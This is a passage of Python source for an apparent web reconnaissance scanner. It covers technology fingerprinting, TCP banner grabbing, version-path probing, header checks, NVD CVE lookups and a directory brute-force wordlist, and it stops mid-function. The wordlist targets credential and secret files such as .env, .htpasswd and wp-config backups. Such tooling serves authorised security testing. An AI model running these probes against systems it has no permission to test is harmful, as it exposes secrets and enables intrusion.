#!/usr/bin/env python3
"""
webanalyzer.py — Advanced Web Reconnaissance & Vulnerability Scanner
─────────────────────────────────────────────────────────────────────────────
Modules:
  1.  Technology Fingerprinting         (passive)
  2.  Service & Version Detection       (passive — HTTP + banner grab)
  3.  Security Header & Cookie Analysis (passive)
  4.  NVD CVE Lookup with CVSS scoring  (passive)
  5.  WAF Detection                     (passive)
  6.  Hidden Directory & File Discovery (active — brute-force)
  7.  Subdomain Enumeration             (active — DNS + crt.sh CT logs)
  8.  SQL Injection Detection           (active)
  9.  XSS Detection                     (active)
  10. Directory Traversal / LFI         (active)
  11. Open Redirect Detection           (active)

Author  : Abdhul Raheem — Security Researcher @ WinSys
LinkedIn: www.linkedin.com/in/abdhul-raheem-thewitehacker1999f
Usage   : python3 webanalyzer.py <target_url> [options]

WARNING : FOR AUTHORISED TESTING ONLY. Do not scan systems you don't own
          or lack written permission to test.

Install : pip install requests colorama
"""

import argparse
import concurrent.futures
import html as html_mod
import json
import re
import socket
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from typing import Optional
from urllib.parse import urlparse, urljoin, parse_qs, urlunparse

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning  # type: ignore

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ─────────────────────────────────────────────────────────────────────────────
# CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────

NVD_API       = "https://services.nvd.nist.gov/rest/json/cves/2.0"
UA            = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                 "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36")
TIMEOUT       = 10
NVD_DELAY     = 6       # NVD free-tier ~10 req/min
ACTIVE_DELAY  = 0.2     # polite delay between active probes
DIR_THREADS   = 25      # concurrent threads for dir brute-force
SUB_THREADS   = 30      # concurrent threads for subdomain DNS brute-force

# ─────────────────────────────────────────────────────────────────────────────
# COLOURS
# ─────────────────────────────────────────────────────────────────────────────

try:
    from colorama import Fore, Style, init as _ci
    _ci(autoreset=True)
    RED = Fore.RED; GREEN = Fore.GREEN; YELLOW = Fore.YELLOW
    CYAN = Fore.CYAN; BLUE = Fore.BLUE; MAGENTA = Fore.MAGENTA
    BOLD = Style.BRIGHT; RESET = Style.RESET_ALL
except ImportError:
    RED = GREEN = YELLOW = CYAN = BLUE = MAGENTA = BOLD = RESET = ""

def _cs(sev):
    return {"CRITICAL": RED+BOLD, "HIGH": RED,
            "MEDIUM": YELLOW, "LOW": GREEN}.get(sev, "") + sev + RESET

def banner():
    print(f"""{CYAN}{BOLD}
╔══════════════════════════════════════════════════════════════════════╗
║          WebAnalyzer — Advanced Web Reconnaissance Scanner           ║
║  Tech · Services · SQLi · XSS · LFI · Dirs · Subdomains · CVE/WAF  ║
║   Developed by Abdhul Raheem @ WinSys  |  Authorised testing only   ║
║   LinkedIn: linkedin.com/in/abdhul-raheem-thewitehacker1999f         ║
╚══════════════════════════════════════════════════════════════════════╝
{RESET}""")

# ─────────────────────────────────────────────────────────────────────────────
# DATA MODELS
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class Technology:
    name: str
    version: Optional[str] = None
    category: str = "Unknown"
    confidence: str = "Medium"

@dataclass
class ServiceInfo:
    name: str                      # e.g. "Apache httpd", "OpenSSH"
    version: Optional[str]         # exact version string if found
    port: Optional[int]
    protocol: str                  # "HTTP" | "HTTPS" | "TCP"
    banner: Optional[str]          # raw banner / header value
    cpe: Optional[str] = None      # CPE string for CVE lookup if derivable

@dataclass
class CVE:
    cve_id: str
    description: str
    cvss_score: Optional[float]
    cvss_version: Optional[str]
    severity: Optional[str]
    published: Optional[str]
    url: str = ""

@dataclass
class Finding:
    vuln_type: str
    severity: str
    url: str
    parameter: str
    method: str
    payload: str
    evidence: str
    confidence: str
    remediation: str = ""

@dataclass
class DiscoveredPath:
    url: str
    status_code: int
    content_length: int
    content_type: str
    sensitive: bool = False
    note: str = ""

@dataclass
class DiscoveredSubdomain:
    fqdn: str
    ip: Optional[str]
    status_code: Optional[int]
    title: Optional[str]
    server: Optional[str]
    source: str   # "brute-force" | "crt.sh" | "crt.sh+resolved"

@dataclass
class ScanResult:
    target: str
    status_code: Optional[int]          = None
    server: Optional[str]               = None
    ip: Optional[str]                   = None
    waf_detected: bool                  = False
    waf_name: Optional[str]             = None
    technologies: list                  = field(default_factory=list)
    services: list                      = field(default_factory=list)
    security_headers: dict              = field(default_factory=dict)
    missing_headers: list               = field(default_factory=list)
    cookies: list                       = field(default_factory=list)
    cves: dict                          = field(default_factory=dict)
    findings: list                      = field(default_factory=list)
    discovered_paths: list              = field(default_factory=list)
    discovered_subdomains: list         = field(default_factory=list)
    errors: list                        = field(default_factory=list)

# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def _hdr(h, key):
    return h.get(key, h.get(key.lower(), ""))

def _re_find(pattern, text, group=1):
    m = re.search(pattern, text, re.I)
    return m.group(group) if m else None

def _safe_get(session, url, **kw):
    try:
        return session.get(url, timeout=TIMEOUT, verify=False,
                           allow_redirects=False, **kw)
    except Exception:
        return None

def _safe_post(session, url, data, **kw):
    try:
        return session.post(url, data=data, timeout=TIMEOUT, verify=False,
                            allow_redirects=False, **kw)
    except Exception:
        return None

def _inject_param(base_url, param, value):
    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_q = urllib.parse.urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_q))

def _get_params(url):
    return list(parse_qs(urlparse(url).query).keys())

def _extract_forms(html, base_url):
    forms = []
    for fm in re.finditer(r"<form[^>]*>(.*?)</form>", html, re.S | re.I):
        fh     = fm.group(0)
        action = _re_find(r'action=["\']([^"\']*)["\']', fh) or base_url
        method = (_re_find(r'method=["\'](\w+)["\']', fh) or "GET").upper()
        action = urljoin(base_url, action)
        fields = []
        for inp in re.finditer(r"<input[^>]*>", fh, re.I):
            ih    = inp.group(0)
            name  = _re_find(r'name=["\']([^"\']*)["\']', ih)
            value = _re_find(r'value=["\']([^"\']*)["\']', ih) or ""
            itype = (_re_find(r'type=["\']([^"\']*)["\']', ih) or "text").lower()
            if name and itype not in ("submit","button","image","reset","hidden"):
                fields.append((name, value))
        for ta in re.finditer(r"<textarea[^>]*name=[\"']([^\"']+)[\"']", fh, re.I):
            fields.append((ta.group(1), ""))
        if fields:
            forms.append({"action": action, "method": method, "fields": fields})
    return forms

def _snippet(text, marker, w=60):
    idx = text.lower().find(marker.lower())
    if idx == -1: return ""
    s, e = max(0, idx-w), min(len(text), idx+len(marker)+w)
    return "…" + text[s:e].replace("\n"," ") + "…"

def _wrap(text, width=72, indent="    "):
    words, lines, line = text.split(), [], []
    for word in words:
        if sum(len(x)+1 for x in line)+len(word) > width:
            lines.append(indent+" ".join(line)); line=[word]
        else:
            line.append(word)
    if line: lines.append(indent+" ".join(line))
    return "\n".join(lines)

def _page_title(html):
    m = re.search(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
    return m.group(1).strip()[:80] if m else None

def _resolve(hostname) -> Optional[str]:
    try: return socket.gethostbyname(hostname)
    except Exception: return None

# ─────────────────────────────────────────────────────────────────────────────
# WAF DETECTION
# ─────────────────────────────────────────────────────────────────────────────

WAF_SIGS = [
    ("Cloudflare",        ["cf-ray", "cloudflare"]),
    ("AWS WAF",           ["awswaf", "x-amzn-requestid"]),
    ("Akamai",            ["akamai", "x-akamai-transformed"]),
    ("Imperva/Incapsula", ["x-iinfo", "incap_ses"]),
    ("Sucuri",            ["x-sucuri-id"]),
    ("ModSecurity",       ["mod_security", "modsecurity"]),
    ("Barracuda",         ["barra_counter_session"]),
    ("F5 BIG-IP ASM",     ["bigipserver"]),
    ("Wordfence",         ["wordfence"]),
]

def detect_waf(resp):
    blob = " ".join(f"{k.lower()}:{v.lower()}" for k,v in resp.headers.items())
    blob += " " + resp.text[:4000].lower()
    for name, sigs in WAF_SIGS:
        if any(s in blob for s in sigs):
            return True, name
    return False, None

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 1 — TECHNOLOGY FINGERPRINTING (passive)
# ─────────────────────────────────────────────────────────────────────────────

FINGERPRINT_RULES = [
    ("Web Server","Apache",
     lambda h,html,url: _re_find(r"Apache(?:/(\d[\d.]*\S*))?",_hdr(h,"Server")) or
                        ("" if "Apache" in _hdr(h,"Server") else None)),
    ("Web Server","Nginx",
     lambda h,html,url: _re_find(r"nginx(?:/(\d[\d.]*\S*))?",_hdr(h,"Server")) or
                        ("" if "nginx" in _hdr(h,"Server").lower() else None)),
    ("Web Server","IIS",
     lambda h,html,url: _re_find(r"Microsoft-IIS(?:/(\d[\d.]*\S*))?",_hdr(h,"Server"))),
    ("Web Server","LiteSpeed",
     lambda h,html,url: _re_find(r"LiteSpeed(?:/(\d[\d.]*\S*))?",_hdr(h,"Server")) or
                        ("" if "LiteSpeed" in _hdr(h,"Server") else None)),
    ("Web Server","Caddy",
     lambda h,html,url: _re_find(r"Caddy(?:/(\d[\d.]*\S*))?",_hdr(h,"Server")) or
                        ("" if "Caddy" in _hdr(h,"Server") else None)),
    ("Web Server","OpenResty",
     lambda h,html,url: _re_find(r"openresty(?:/(\d[\d.]*\S*))?",_hdr(h,"Server"))),
    ("Language","PHP",
     lambda h,html,url: _re_find(r"PHP/(\d[\d.]*\S*)",_hdr(h,"X-Powered-By")) or
                        _re_find(r"PHP/(\d[\d.]*\S*)",_hdr(h,"Server")) or
                        ("" if ".php" in url.lower() else None)),
    ("Language","ASP.NET",
     lambda h,html,url: _re_find(r"ASP\.NET",_hdr(h,"X-Powered-By")) or
                        _re_find(r"v(\d[\d.]*)",_hdr(h,"X-AspNet-Version"))),
    ("Language","Python",
     lambda h,html,url: _re_find(r"Python/(\d[\d.]*\S*)",_hdr(h,"X-Powered-By")) or
                        ("" if any(x in _hdr(h,"Server")+_hdr(h,"X-Powered-By")
                        for x in ("Python","Werkzeug","gunicorn")) else None)),
    ("Language","Ruby on Rails",
     lambda h,html,url: "" if "Phusion Passenger" in _hdr(h,"Server") or
                        "X-Runtime" in h else None),
    ("Language","Node.js",
     lambda h,html,url: "" if "Express" in _hdr(h,"X-Powered-By") else None),
    ("CMS","WordPress",
     lambda h,html,url: _re_find(r"WordPress[/ ](\d[\d.]*\S*)",html) or
                        ("" if "/wp-content/" in html or "/wp-includes/" in html else None)),
    ("CMS","Joomla",
     lambda h,html,url: "" if "Joomla" in html or "/components/com_" in html else None),
    ("CMS","Drupal",
     lambda h,html,url: _re_find(r"Drupal (\d[\d.]*\S*)",html) or
                        ("" if "Drupal" in _hdr(h,"X-Generator") else None)),
    ("CMS","Magento",
     lambda h,html,url: "" if "Mage.Cookies" in html or "/skin/frontend/" in html else None),
    ("CMS","Shopify",
     lambda h,html,url: "" if "Shopify" in html or ".myshopify.com" in html else None),
    ("CMS","Ghost",
     lambda h,html,url: _re_find(r"Ghost/(\d[\d.]*\S*)",_hdr(h,"X-Powered-By")) or
                        ("" if "ghost.io" in html else None)),
    ("JS Framework","React",
     lambda h,html,url: _re_find(r"react[.-](\d[\d.]*)",html) or
                        ("" if "data-reactroot" in html or "react-dom" in html else None)),
    ("JS Framework","Vue.js",
     lambda h,html,url: _re_find(r"vue[.-](\d[\d.]*)",html) or
                        ("" if "data-v-" in html or "__vue__" in html else None)),
    ("JS Framework","Angular",
     lambda h,html,url: _re_find(r"ng-version=[\"'](\d[\d.]*)[\"']",html) or
                        ("" if "ng-version" in html or "angular.min.js" in html else None)),
    ("JS Framework","jQuery",
     lambda h,html,url: _re_find(r"jquery[.-](\d[\d.]*)",html) or
                        ("" if "jquery" in html.lower() else None)),
    ("JS Framework","Next.js",
     lambda h,html,url: _re_find(r'"version"\s*:\s*"(\d[\d.]*)"',html) if "__NEXT_DATA__" in html else None or
                        ("" if "__NEXT_DATA__" in html else None)),
    ("JS Framework","Nuxt.js",
     lambda h,html,url: "" if "__NUXT__" in html else None),
    ("CDN","Cloudflare",
     lambda h,html,url: "" if "cloudflare" in _hdr(h,"Server").lower()
                        or "CF-RAY" in h or "cf-ray" in h else None),
    ("CDN","Fastly",
     lambda h,html,url: "" if "Fastly" in _hdr(h,"Via") else None),
    ("CDN","Akamai",
     lambda h,html,url: "" if "Akamai" in str(h) else None),
    ("Auth","JWT",
     lambda h,html,url: "" if "eyJ" in html else None),
    ("Analytics","Google Analytics",
     lambda h,html,url: "" if "google-analytics.com" in html or "gtag/js" in html else None),
    ("Analytics","Matomo",
     lambda h,html,url: "" if "matomo.js" in html or "piwik.js" in html else None),
]

def fingerprint(headers, html, url):
    techs, seen = [], set()
    for cat, name, fn in FINGERPRINT_RULES:
        try: result = fn(headers, html, url)
        except Exception: result = None
        if result is not None and name not in seen:
            seen.add(name)
            ver  = result if result else None
            conf = "High" if ver else "Medium"
            techs.append(Technology(name, ver, cat, conf))
    return techs

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 2 — SERVICE & VERSION DETECTION
# ─────────────────────────────────────────────────────────────────────────────
# Approach:
#   A) Parse all version-bearing HTTP response headers exhaustively
#   B) Banner-grab common adjacent TCP ports (22, 21, 25, 3306, 5432, 6379…)
#   C) Probe well-known HTTP paths that expose version info
# ─────────────────────────────────────────────────────────────────────────────

# --- A) Header-based service signatures ---

# Maps header → list of (regex, service_name, protocol)
HEADER_SERVICE_PATTERNS = [
    # Server header
    ("Server", [
        (r"Apache(?:[ /](\d[\d.]*\S*))?",                "Apache httpd",   "HTTP"),
        (r"nginx(?:/(\d[\d.]*\S*))?",                     "Nginx",          "HTTP"),
        (r"Microsoft-IIS(?:/(\d[\d.]*\S*))?",             "Microsoft IIS",  "HTTP"),
        (r"LiteSpeed(?:/(\d[\d.]*\S*))?",                 "LiteSpeed",      "HTTP"),
        (r"openresty(?:/(\d[\d.]*\S*))?",                 "OpenResty",      "HTTP"),
        (r"Caddy(?:/(\d[\d.]*\S*))?",                     "Caddy",          "HTTP"),
        (r"gunicorn(?:/(\d[\d.]*\S*))?",                  "Gunicorn",       "HTTP"),
        (r"Jetty(?:/(\d[\d.]*\S*))?",                     "Jetty",          "HTTP"),
        (r"Werkzeug(?:/(\d[\d.]*\S*))?",                  "Werkzeug",       "HTTP"),
        (r"Tornado(?:/(\d[\d.]*\S*))?",                   "Tornado",        "HTTP"),
        (r"Tomcat(?:/(\d[\d.]*\S*))?",                    "Apache Tomcat",  "HTTP"),
        (r"GlassFish(?:/(\d[\d.]*\S*))?",                 "GlassFish",      "HTTP"),
        (r"WildFly(?:/(\d[\d.]*\S*))?",                   "WildFly",        "HTTP"),
        (r"WebLogic(?:/(\d[\d.]*\S*))?",                  "Oracle WebLogic","HTTP"),
        (r"IdeaWebServer(?:/(\d[\d.]*\S*))?",             "IdeaWebServer",  "HTTP"),
        (r"lighttpd(?:/(\d[\d.]*\S*))?",                  "lighttpd",       "HTTP"),
        (r"Cowboy",                                       "Cowboy (Erlang)","HTTP"),
        (r"cloudflare",                                   "Cloudflare",     "HTTP"),
    ]),
    # X-Powered-By
    ("X-Powered-By", [
        (r"PHP/(\d[\d.]*\S*)",                            "PHP",            "HTTP"),
        (r"ASP\.NET",                                     "ASP.NET",        "HTTP"),
        (r"Express(?:/(\d[\d.]*\S*))?",                   "Node.js/Express","HTTP"),
        (r"Servlet(?:/(\d[\d.]*\S*))?",                   "Java Servlet",   "HTTP"),
        (r"Next\.js",                                     "Next.js",        "HTTP"),
        (r"Ruby on Rails",                                "Ruby on Rails",  "HTTP"),
    ]),
    # X-AspNet-Version
    ("X-AspNet-Version", [
        (r"(\d[\d.]*)",                                   "ASP.NET CLR",    "HTTP"),
    ]),
    # X-Generator
    ("X-Generator", [
        (r"Drupal (\d[\d.]*\S*)",                         "Drupal CMS",     "HTTP"),
        (r"WordPress (\d[\d.]*\S*)",                      "WordPress CMS",  "HTTP"),
    ]),
    # Via
    ("Via", [
        (r"(\d\.\d)\s+(\S+)",                             "Proxy",          "HTTP"),
    ]),
]

def _extract_services_from_headers(headers: dict, port: int, scheme: str) -> list[ServiceInfo]:
    services = []
    proto    = scheme.upper()
    h_lower  = {k.lower(): v for k,v in headers.items()}

    for hdr_name, patterns in HEADER_SERVICE_PATTERNS:
        hdr_val = h_lower.get(hdr_name.lower(), "")
        if not hdr_val:
            continue
        matched = False
        for pat, svc_name, svc_proto in patterns:
            m = re.search(pat, hdr_val, re.I)
            if m:
                ver    = m.group(1) if m.lastindex and m.lastindex >= 1 else None
                banner = f"{hdr_name}: {hdr_val}"
                services.append(ServiceInfo(svc_name, ver, port, proto, banner))
                matched = True
                break
        if not matched and hdr_val:
            # If header present but no pattern matched, record raw value
            if hdr_name in ("Server", "X-Powered-By"):
                services.append(ServiceInfo(hdr_val.split("/")[0].strip(), None,
                                            port, proto, f"{hdr_name}: {hdr_val}"))
    return services


# --- B) TCP banner grab ---

BANNER_PORTS = {
    21:   "FTP",
    22:   "SSH",
    23:   "Telnet",
    25:   "SMTP",
    110:  "POP3",
    143:  "IMAP",
    3306: "MySQL",
    5432: "PostgreSQL",
    6379: "Redis",
    27017:"MongoDB",
    11211:"Memcached",
    8080: "HTTP-alt",
    8443: "HTTPS-alt",
    9200: "Elasticsearch",
    9300: "Elasticsearch-transport",
    5601: "Kibana",
    3000: "Node/Grafana",
    8888: "Jupyter/misc",
    2181: "ZooKeeper",
    4848: "GlassFish-admin",
    7001: "WebLogic",
    7474: "Neo4j",
    5984: "CouchDB",
    1521: "Oracle DB",
    1433: "MSSQL",
}

# Version patterns extracted from TCP banners
BANNER_VERSION_PATTERNS = [
    (r"SSH-(\d[\d.]+)-OpenSSH[_ ](\d[\d.p]*)",    "OpenSSH",       lambda m: m.group(2)),
    (r"SSH-(\d[\d.]+)-(\S+)",                       "SSH Server",    lambda m: m.group(2)),
    (r"220.*?FTP.*?(\d[\d.]+)",                     "FTP Server",    lambda m: m.group(1)),
    (r"220.*?vsftpd (\d[\d.]+)",                    "vsftpd",        lambda m: m.group(1)),
    (r"220.*?ProFTPD (\d[\d.]+)",                   "ProFTPD",       lambda m: m.group(1)),
    (r"MySQL.*?(\d+\.\d+\.\d+)",                    "MySQL",         lambda m: m.group(1)),
    (r"(\d+\.\d+\.\d+).*?MySQL",                    "MySQL",         lambda m: m.group(1)),
    (r"PostgreSQL",                                 "PostgreSQL",    lambda m: None),
    (r"\+OK.*?(\d[\d.]+)",                          "POP3",          lambda m: m.group(1)),
    (r"redis_version:(\d[\d.]+)",                   "Redis",         lambda m: m.group(1)),
    (r"memcached (\d[\d.]+)",                       "Memcached",     lambda m: m.group(1)),
]

def _tcp_banner_grab(host: str, port: int, timeout: float = 3.0) -> Optional[str]:
    """Grab the first 1024 bytes from a TCP port."""
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            # Send a minimal probe for non-banner ports
            if port in (3306, 5432, 27017):
                pass  # these send banner on connect
            elif port == 6379:
                s.sendall(b"INFO server\r\n")
            elif port == 11211:
                s.sendall(b"version\r\n")
            elif port in (80, 8080):
                s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = b""
            try:
                while len(banner) < 1024:
                    chunk = s.recv(256)
                    if not chunk: break
                    banner += chunk
            except Exception:
                pass
            return banner.decode("utf-8", errors="replace").strip()
    except Exception:
        return None


def _parse_banner(raw: str, port: int, proto_hint: str) -> Optional[ServiceInfo]:
    if not raw:
        return None
    for pat, svc_name, ver_fn in BANNER_VERSION_PATTERNS:
        m = re.search(pat, raw, re.I)
        if m:
            try: ver = ver_fn(m)
            except Exception: ver = None
            return ServiceInfo(svc_name, ver, port, proto_hint,
                               raw[:120].replace("\n", " "))
    # Fallback — record the banner as-is
    first_line = raw.split("\n")[0].strip()[:80]
    if first_line:
        return ServiceInfo(proto_hint + "-service", None, port,
                           proto_hint, first_line)
    return None


def detect_services(resp: requests.Response, hostname: str) -> list[ServiceInfo]:
    """
    Combined service detection:
      1. Exhaustive HTTP header parsing
      2. TCP banner grab on a set of common ports
      3. Probe specific HTTP paths that expose version info
    """
    parsed = urlparse(resp.url)
    scheme = parsed.scheme
    port   = parsed.port or (443 if scheme == "https" else 80)

    services: list[ServiceInfo] = []
    seen: set = set()

    def _add(svc: Optional[ServiceInfo]):
        if svc and (svc.name, svc.port) not in seen:
            seen.add((svc.name, svc.port))
            services.append(svc)

    # 1. Headers
    for svc in _extract_services_from_headers(dict(resp.headers), port, scheme):
        _add(svc)

    # 2. TCP banner grab on adjacent ports
    print(f"    Grabbing TCP banners on common ports...")
    for bport, proto_hint in BANNER_PORTS.items():
        banner_raw = _tcp_banner_grab(hostname, bport, timeout=2.0)
        if banner_raw:
            svc = _parse_banner(banner_raw, bport, proto_hint)
            if svc:
                _add(svc)
                print(f"    {GREEN}[port {bport}]{RESET} {svc.name}"
                      + (f" v{svc.version}" if svc.version else "")
                      + f"  — {svc.banner[:60] if svc.banner else ''}")

    # 3. HTTP path probes for version disclosure
    session = requests.Session()
    session.headers.update({"User-Agent": UA})
    session.verify = False
    base = f"{scheme}://{parsed.netloc}"

    VERSION_PATHS = [
        ("/phpinfo.php",    r"PHP Version\s*</td><td[^>]*>\s*(\d[\d.]+)","PHP"),
        ("/info.php",       r"PHP Version\s*</td><td[^>]*>\s*(\d[\d.]+)","PHP"),
        ("/server-status",  r"Apache(?:/(\d[\d.]+))?",                   "Apache httpd"),
        ("/server-info",    r"Apache(?:/(\d[\d.]+))?",                   "Apache httpd"),
        ("/wp-login.php",   r"WordPress[/ ](\d[\d.]+)",                  "WordPress"),
        ("/wp-json/",       r'"version"\s*:\s*"(\d[\d.]+)"',             "WordPress REST"),
        ("/robots.txt",     r"",                                          None),          # just existence
        ("/CHANGELOG.txt",  r"Drupal (\d[\d.]+)",                        "Drupal"),
        ("/core/CHANGELOG.txt",r"Drupal (\d[\d.]+)",                     "Drupal"),
        ("/README.txt",     r"Joomla[! ]*(\d[\d.]+)",                    "Joomla"),
        ("/administrator/manifests/files/joomla.xml",
                            r"<version>(\d[\d.]+)",                      "Joomla"),
        ("/actuator/info",  r'"version"\s*:\s*"(\d[\d.]+)"',             "Spring Boot"),
        ("/actuator/health",r'"status"\s*:\s*"UP"',                      "Spring Boot Actuator"),
        ("/_cat/nodes",     r"(\d[\d.]+)",                               "Elasticsearch"),
        ("/api/v1/version", r'"version"\s*:\s*"(\d[\d.]+)"',             "API"),
    ]

    for path, pattern, svc_name in VERSION_PATHS:
        try:
            r = session.get(base + path, timeout=6, verify=False,
                            allow_redirects=True)
            if r.status_code in (200, 401, 403) and svc_name:
                ver = None
                if pattern:
                    m = re.search(pattern, r.text, re.I)
                    ver = m.group(1) if m and m.lastindex else None
                svc = ServiceInfo(svc_name, ver, port, scheme.upper(),
                                  f"HTTP probe: {path}")
                _add(svc)
                col = GREEN if r.status_code == 200 else YELLOW
                print(f"    {col}[HTTP {r.status_code}]{RESET} {path}"
                      + (f"  → {svc_name}" + (f" v{ver}" if ver else "") if svc_name else ""))
        except Exception:
            pass

    return services

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 3 — SECURITY HEADERS & COOKIES
# ─────────────────────────────────────────────────────────────────────────────

SECURITY_HEADERS = {
    "Strict-Transport-Security": "Prevents protocol downgrade (HSTS)",
    "Content-Security-Policy":   "Mitigates XSS & data injection",
    "X-Content-Type-Options":    "Prevents MIME sniffing",
    "X-Frame-Options":           "Protects against clickjacking",
    "Referrer-Policy":           "Controls referrer leakage",
    "Permissions-Policy":        "Controls browser feature permissions",
    "X-XSS-Protection":          "Legacy XSS filter",
}

def check_security_headers(headers):
    lc = {k.lower(): v for k, v in headers.items()}
    present, missing = {}, []
    for hdr, desc in SECURITY_HEADERS.items():
        v = lc.get(hdr.lower())
        if v: present[hdr] = v
        else: missing.append(hdr)
    return present, missing

def check_cookies(response):
    issues = []
    for ck in response.cookies:
        flags = []
        if not ck.secure: flags.append("Missing Secure flag")
        if not ck.has_nonstandard_attr("HttpOnly"): flags.append("Missing HttpOnly flag")
        ss = ck._rest.get("SameSite","").upper()  # type: ignore
        if ss not in ("STRICT","LAX"): flags.append("SameSite not Strict/Lax")
        if flags: issues.append({"name": ck.name, "issues": flags})
    return issues

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 4 — NVD CVE LOOKUP
# ─────────────────────────────────────────────────────────────────────────────

def _sev(score):
    if score is None: return "Unknown"
    if score >= 9.0:  return "CRITICAL"
    if score >= 7.0:  return "HIGH"
    if score >= 4.0:  return "MEDIUM"
    return "LOW"

def query_nvd(name, version=None, max_cves=5):
    kw = name + (f" {version}" if version else "")
    try:
        r = requests.get(NVD_API, params={"keywordSearch": kw,
                         "resultsPerPage": max_cves}, timeout=TIMEOUT)
        r.raise_for_status()
        data = r.json()
    except Exception:
        return []
    cves = []
    for item in data.get("vulnerabilities", []):
        cd  = item.get("cve", {})
        cid = cd.get("id","N/A")
        pub = cd.get("published","")[:10]
        desc= next((d["value"] for d in cd.get("descriptions",[]) if d.get("lang")=="en"),"")
        score, ver = None, None
        for v,key in [("3.1","cvssMetricV31"),("3.0","cvssMetricV30"),("2.0","cvssMetricV2")]:
            ent = cd.get("metrics",{}).get(key,[])
            if ent:
                score = ent[0].get("cvssData",{}).get("baseScore")
                ver = v; break
        cves.append(CVE(cid, desc[:300], score, ver, _sev(score), pub,
                        f"https://nvd.nist.gov/vuln/detail/{cid}"))
    return cves

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 5 — HIDDEN DIRECTORY & FILE BRUTE-FORCE
# ─────────────────────────────────────────────────────────────────────────────

DIR_WORDLIST = [
    # Admin panels
    "admin","administrator","admin/login","admin/dashboard","wp-admin",
    "wp-login.php","cpanel","phpmyadmin","phpMyAdmin","pma","adminer",
    "adminer.php","manager","management","controlpanel","panel","portal",
    "backend","staff","superadmin","webadmin","siteadmin",
    # Config & env files
    ".env",".env.local",".env.production",".env.backup",".env.dev",
    "config.php","config.yml","config.yaml","config.json","config.ini",
    "configuration.php","settings.php","settings.py","settings.ini",
    "local.xml","web.config","appsettings.json","application.properties",
    "database.yml","database.json","db.php","db.sql","app.config",
    # Backup files
    "backup","backups","backup.zip","backup.tar.gz","backup.sql",
    "database.sql","dump.sql","site.zip","www.zip","htdocs.zip",
    "db_backup.sql","backup.bak","backup.tar","archive","old",
    # Source control & IDE
    ".git",".git/config",".git/HEAD",".git/COMMIT_EDITMSG",
    ".git/logs/HEAD",".svn",".svn/entries",".hg",
    ".DS_Store","Thumbs.db",".idea",".vscode",
    # Framework-specific
    "storage","storage/logs","storage/app","storage/framework",
    "bootstrap/cache","vendor","composer.json","composer.lock",
    "package.json","package-lock.json","yarn.lock","Gemfile","Gemfile.lock",
    # Well-known / info
    ".well-known",".well-known/security.txt","security.txt",
    "robots.txt","sitemap.xml","sitemap.xml.gz","crossdomain.xml",
    # API & docs
    "api","api/v1","api/v2","api/v3","graphql","rest",
    "swagger","swagger.json","swagger.yaml","swagger-ui",
    "api-docs","openapi.json","openapi.yaml","redoc",
    # Spring Boot Actuator
    "actuator","actuator/health","actuator/env","actuator/mappings",
    "actuator/beans","actuator/info","actuator/dump","actuator/trace",
    # Logs
    "logs","log","error.log","access.log","debug.log",
    "laravel.log","app.log","application.log",
    # Upload/media dirs
    "uploads","upload","files","file","images","media","static","assets","public",
    # Install / setup
    "install","install.php","setup","setup.php","upgrade","update",
    # PHP info / debug
    "info.php","phpinfo.php","test.php","php.php","debug.php","trace.php",
    # Server meta
    "server-status","server-info",".htaccess",".htpasswd",
    # CMS-specific
    "wp-content/uploads","wp-content/debug.log",
    "wp-config.php","wp-config.php.bak","wp-json",
    "xmlrpc.php","wp-cron.php",
    "administrator/manifests/files/joomla.xml",
    "core/CHANGELOG.txt","CHANGELOG.txt","README.txt",
    # Auth endpoints
    "login","logout","register","signup","signin",
    "auth","oauth","oauth/token","sso","saml","callback",
    # DevOps
    "jenkins","jenkins/login","hudson",".travis.yml",
    "Dockerfile","docker-compose.yml",".dockerignore","Makefile",
    "requirements.txt","Pipfile",
    # Health / monitoring
    "health","healthz","health-check","status","ping","alive",
    "metrics","monitor","_status",
    # Misc
    "readme.txt","README.md","CHANGELOG.md","LICENSE",
    "test","tests","demo","dev","debug","tmp","temp","cache","cgi-bin",
    "404.php","500.php","error.php",
]

SENSITIVE_KEYWORDS = (
    "admin","config","backup","env","sql","db","log","password","passwd",
    "secret","key","token","git","svn","htpasswd","htaccess","phpinfo",
    "setup","install","actuator","debug","dump","wp-config","xmlrpc",
    "credential","private","shadow",
)

DIR_HIT_CODES = {200, 201, 204, 301, 302, 307, 308, 401, 403, 405, 500}

def _is_sensitive(path: str) -> bool:
    low = path.lower()
    return any(kw in low for kw in SENSITIVE_KEYWORDS)

def _probe_path(session, base_url, path) -> Optional[DiscoveredPath]:
    url = base_url.rstrip("/") + "/" + path.lstrip("/")
    r = _safe_get(session, url)
    if r is None or r.status_code not in DIR_HIT_CODES:
        return None
    ct  = r.headers.get("Content-Type","").split(";")[0].strip()
    cl  = len(r.content)
    sensitive = _is_sensitive(path)
    note = {
        401: "Auth required — resource exists",
        403: "Forbidden — resource exists but access denied",
        500: "Internal Server Error — possible misconfiguration",
    }.get(r.status_code, "")
    if r.status_code in (301,302,307,308):
        note = f"Redirects → {r.headers.get('Location','?')}"
    return DiscoveredPath(url, r.status_code, cl, ct, sensitive, note)

def scan_directories(session, base_url, threads=DIR_THREADS,
                     extra_words=None) -> list[DiscoveredPath]:
    words = list(DIR_WORDLIST)
    if extra_words:
        words += [w.strip() for w in extra_words if w.strip()]
    parsed = urlparse(base_url)
    base   = f"{parsed.scheme}://{parsed.netloc}"
    found  = []
    total  = len(words)
    done   = 0
    print(f"    Probing {total} paths on {base}  [{threads} threads]")

